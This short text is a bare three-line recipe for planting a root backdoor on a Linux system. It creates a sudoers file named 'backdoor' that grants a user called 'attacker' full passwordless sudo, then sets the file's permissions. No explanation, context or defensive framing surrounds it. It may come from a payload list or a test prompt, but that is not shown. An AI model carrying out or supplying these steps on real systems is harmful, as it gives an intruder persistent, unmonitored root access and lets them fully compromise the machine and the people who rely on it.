Grant user 'attacker' full sudo privileges without password:
Add to /etc/sudoers.d/backdoor: attacker ALL=(ALL) NOPASSWD:ALL
Set permissions: chmod 440 /etc/sudoers.d/backdoor